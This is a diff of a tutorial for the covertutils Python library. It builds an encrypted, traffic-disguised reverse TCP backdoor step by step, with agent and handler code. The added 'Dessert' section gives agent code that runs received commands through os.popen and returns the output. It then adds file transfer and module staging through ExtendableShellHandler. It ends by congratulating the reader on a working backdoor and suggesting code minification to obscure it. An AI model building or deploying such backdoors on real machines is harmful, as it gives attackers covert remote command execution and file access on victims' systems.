@@ -35,7 +35,7 @@ But I bet that you know all that.
 
 
 
-*So this code snippet above is the `Agent`. Moving on...
+So this code snippet above is the `Agent`. Moving on...
 
 
 
@@ -61,7 +61,7 @@ Main Course - With `covertutils`
 --------------------------------
 
 
-Let's remake a reverse TCP shell, but that time using `covertutils`.
+Let's remake a `reverse TCP shell`, but that time using `covertutils`.
 
 Agent
 +++++
@@ -71,8 +71,7 @@ Agent
 Orchestration Step
 ^^^^^^^^^^^^^^^^^^
 
-First we are gonna need an ``Orchestrator`` object. This will password-protect our communication, providing us fixed-size byte arrays. Those bytes can be transmitted in any way, plus recognized amongst random data.
-In our case we will send them over through a plain TCP connection.
+First we are gonna need an ``Orchestrator`` object. This will **password-protect our communication**, providing us fixed-size byte arrays. Those bytes can be transmitted in any way, plus recognized **amongst random data**.
 
 .. code:: python
 
@@ -85,11 +84,11 @@ In our case we will send them over through a plain TCP connection.
 		)
 
 
-Done. Now we are sure that all bytes arrays leaving our side will have a fixed length of 20 bytes (even if we send a plain ``whoami`` command which consists of 6 bytes). This is in case we need to fit them somewhere where a fixed bytelength is needed.
+Done. Now we are sure that all byte arrays leaving our side will have a fixed length of 20 bytes (even if we send a plain ``whoami`` command which consists of 6 bytes). This is in case we need to fit them somewhere where a fixed bytelength is needed...
 
 We also have to be sure that every byte array arriving to our side is also of 20 bytes exactly.
 
-Finally, the arrays are encrypto-scrambled using derivatives of our `passphrase`, so they will look gibberish to anyone that doesn't have that `passphrase`.
+Finally, the arrays are `crypto-scrambled` using derivatives of our `passphrase`, so they will look gibberish to anyone that doesn't have that `passphrase`.
 
 Communication Channel Step
 ^^^^^^^^^^^^^^^^^^^^^^^^^^
@@ -109,7 +108,8 @@ Then, we have to provide wrappers for the `Communication Channel`. TCP that is. 
 		return s.recv(4096)	# This will automatically block as socket.recv() is a blocking method
 
 
-All set. Special needs on data that will go through the wire can be coded in those functions!
+All set. Special needs on data that will go through the wire can be coded in those functions too!
+
 For example, if we need all data to travel in ``base64``, then we create the ``send( data )`` and ``recv()`` as below:
 
 .. code:: python
@@ -117,7 +117,7 @@ For example, if we need all data to travel in ``base64``, then we create the ``s
 	import codecs
 
 	def send( data ) :
-		s.send( codecs.encode( data, 'base64') )	# Base64 will travel
+		s.send( codecs.encode( data, 'base64') )	# Data will travel in Base64
 
 	def recv() :
 		data = s.recv(4096)
@@ -153,7 +153,7 @@ So, let's make some cool stuff using the ``BaseHandler`` first !
 			print ( "[+] Message arrived!" )
 			print ( "{} -> {}".format(stream, message) )
 			print ("[>] Sending the received message in reverse order!")
-			self.preferred_send( message[::-1] )
+			self.preferred_send( message[::-1] )	# Will respond with the reverse of what was received!
 
 		def onChunk( self, stream, message ) :
 			print ( "[+] Chunk arrived for stream '{}' !".format(stream) )
@@ -167,7 +167,7 @@ So, let's make some cool stuff using the ``BaseHandler`` first !
 			print()
 
 
-Those methods will be automatically by called by an internal thread (no need to start it manually), so anything written to their bodies will run when circumstances meet.
+Those methods will be called **automatically** by an internal thread (no need to start it manually), so anything written to their bodies will run when circumstances meet.
 
 
 Putting it all together!
@@ -185,12 +185,12 @@ Putting it all together!
 
 **Done!**
 
-Once this script runs, and the ``MyAgent_Handler`` instantiates, it will listen to the TCP connection (`internal thread magic`) and run the ``on*`` methods automatically.
+Once this script runs, and the ``MyAgent_Handler`` gets instantiated, it will listen to the TCP connection (`internal thread magic`) and run the ``on*`` methods automatically.
 
-As all backdoor functionality is implemented in those methods, our **Agent is FINISHED!**
+As all backdoor functionality is implemented in those methods (sending back the received messages reversed - `reverse echo`), our **Agent is FINISHED!**
 
 
-With such agent we can't have a simple ``netcat`` handler though... We need something bigger. Let's jump to it...
+With such agent we can't have a simple ``netcat`` `Handler` though... We need something bigger. Let's jump to it...
 
 
 Handler
@@ -226,7 +226,7 @@ Pretty straightforward, moving one...
 Communication Channel Step
 ^^^^^^^^^^^^^^^^^^^^^^^^^^
 
-As we have a Reverse TCP connection, our `Handler` must be a TCP listener.
+As we have a `Reverse TCP` connection, our `Handler` must be a `TCP listener`.
 
 Pure python socket magic ahead:
 
@@ -273,8 +273,8 @@ Feature Step
 
 		def onMessage( self, stream, message ) :
 			print ( "[+] Message arrived!" )
-			print ( "{} -> {}".format(stream, message) )	# <-------
-			print ( "[<] Original Message {}".format(message[::-1]) )
+			print ( "{} -> {}".format(stream, message) )
+			print ( "[<] Original Message {}".format(message[::-1]) ) # <-------
 
 		def onChunk( self, stream, message ) :
 			print ( "[+] Chunk arrived for stream '{}' !".format(stream) )
@@ -321,11 +321,11 @@ For that we can use the :meth:`preferred_send` method of the :class:`BaseHandler
 
 Here we got a custom shell that gets user input and sends it over.
 
-There is a vastly better way but I leave it for **Dessert**.
+There is a vastly better way but I'll leave it for **Dessert**.
 
 
-Real Life Backdoor - With `covertutils`
----------------------------------------
+Dessert - Real Life Backdoor With `covertutils`
+-----------------------------------------------
 
 
 Here we will use the goodies that are found in the ``impl`` sub-packages to snip away most of the code while actually adding functionality!
@@ -333,3 +333,185 @@ Here we will use the goodies that are found in the ``impl`` sub-packages to snip
 
 Agent
 +++++
+
+The `Orchestration Step` is boringly same. Blah, blah `encryption`, blah blah `chunks`, blah...
+
+The same goes for `Communication Channel Step`. It's a TCP connection. No magic there.
+
+Let's move to the juicy part!
+
+
+Feature Step
+^^^^^^^^^^^^
+
+Let's make our backdoor to actually run shell commands! We could do that by hand, with:
+
+.. code:: python
+
+	import os
+
+	# [...] Handler Class definition
+
+		def onMessage(self, stream, message) :
+			resp = os.popen(message).read()
+
+	# [...] Overriding rest of the on*() methods
+
+
+And sending the response back to the `Handler` would be as easy as:
+
+.. code:: python
+
+	import os
+
+	# [...] Handler Class definition
+
+		def onMessage(self, stream, message) :
+			resp = os.popen(message).read()
+			self.preferred_send(resp)	# <-------
+
+	# [...] Overriding rest of the on*() methods
+
+
+**But**
+
+The class ``ExtendableShellHandler`` (docs @ :class:`covertutils.handlers.impl.extendableshell.ExtendableShellHandler`) does provide:
+
+ - OS shell commands
+ - Python remote interpretation in the stage module API (see: :ref:`stage_api_page`)
+ - `File upload/download` functionality
+ - Extendability through the `module staging system` (see: :ref:`stages_page`)
+ - Agent Control stream, for `OTP key resetting` and `connection reclaiming`
+
+All above things will run on different `Streams` (see: :ref:`streams_arch`), meaning that they will have different OTP keys.
+
+Plus all those will be done **without the need to make an inheriting class** (as it is in ``impl`` subpackage)!
+
+.. note:: That is except when you need any behaviors `Handler` classes - see: :ref:`behaviors`. If that is the case you can create a class inheriting both from ``ExtendableShellHandler`` and a behavior `Handler` class (e.g. ``InterrogatingHandler`` class - Docs @ :class:`covertutils.handlers.interrogating.InterrogatingHandler`). **Multiple Inheritance Rocks!**
+
+
+So the code would be like:
+
+.. code:: python
+
+	from covertutils.handlers.impl import ExtendableShellHandler
+
+	ext_handler_obj = ExtendableShellHandler(recv, send, orch_obj)
+
+	from time import sleep
+
+	while True : sleep(10)
+
+
+Let's go to the `Handler` and ask for the `Check`...
+
+
+Handler
++++++++
+
+
+Same boring stuff for `Orchestration Step` and `Communication Channel Step`.
+
+
+
+Feature Step
+^^^^^^^^^^^^
+
+The `Handler` part here shouldn't change too.
+
+.. code:: python
+
+	# ========== Completely Unchanged ==========
+	from covertutils.handlers import BaseHandler
+
+	class MyHandler_Handler( BaseHandler ) :
+		""" This class tries hard to be self-explanatory """
+
+		def __init__(self, recv, send, orch, **kw) :
+			super( MyHandler_Handler, self ).__init__( recv, send, orch, **kw )
+			print ( "[!] Handler with Orchestrator ID: '{}' started!".format( orch.getIdentity() ) )
+			print()
+
+
+		def onMessage( self, stream, message ) :
+			print ( "[+] Message arrived!" )
+			print ( "{} -> {}".format(stream, message) )
+			print ( "[<] Original Message {}".format(message[::-1]) )	# <-------
+
+		def onChunk( self, stream, message ) :
+			print ( "[+] Chunk arrived for stream '{}' !".format(stream) )
+			if message :
+				print ("[*] Message assembled. onMessage() will be called next!")
+			print()
+
+		def onNotRecognised(self) :
+			print ("[-] Got some Gibberish")
+			print ("Initialized the Orchestrator with wrong passphrase?")
+			print()
+	# ==========================================
+
+It has to be instantiated as well:
+
+
+.. code :: python
+
+	handler_obj = MyHandler_Handler(recv, send, orch_obj)
+
+
+But here we will do a lil' change. We won't use that shitty ``[raw_]input`` shell! There are great shell alternatives in :mod:`covertutils.shell.impl`, perfectly pairing with classes in the :mod:`covertutils.handlers.impl` sub-package.
+
+For the ``ExtendableShellHandler`` that is running in the other side, the ``ExtendableShell`` (Docs @ :class:`covertutils.shells.impl.extendableshell.ExtendableShell` will fit just great!
+
+It provides all needed support to interact with the awaiting `Agent`, by using the SubShells corresponding to ``ExtendableShellHandler`` preloaded `stage modules`.
+
+
+**AND**
+
+As the ``ExtendableShell`` handles all `printing to the screen` the ``MyHandler_Handler`` class can be as `barebones` as:
+
+.. code :: python
+
+	from covertutils.handlers import BaseHandler
+
+	class MyHandler_Handler( BaseHandler ) :
+		""" This class tries hard to be self-explanatory """
+
+		def __init__(self, recv, send, orch, **kw) :
+			super( MyHandler_Handler, self ).__init__( recv, send, orch, **kw )
+			print ( "[!] Handler with Orchestrator ID: '{}' started!".format( orch.getIdentity() ) )
+
+		def onMessage( self, stream, message ) :	pass
+
+		def onChunk( self, stream, message ) :	pass
+
+		def onNotRecognised(self) :	pass
+
+
+
+
+And the code for instantiation looks like this:
+
+
+.. code :: python
+
+	shell = ExtendableShell(handler_obj, prompt = "MyFirst {package} Shell> ")
+	shell.start()
+
+
+
+
+
+The Check
+---------
+
+
+Congrats hoodie guy! You made your first `Reverse TCP Backdoor`!
+
+Throw in some `parameterization` (**un-hardcode** `passphrase` and addresses), `code minification` (pyMinify_ that code) and `connection re-attempt mechanism` (see :ref:`rev_tcp`), and you are done!
+
+**This will cost you 0$ sir...**
+
+.. _pyMinify : https://liftoff.github.io/pyminifier/
+
+
+*Be polite enough to `share your creations`. Or at least sell them `for the same price`...
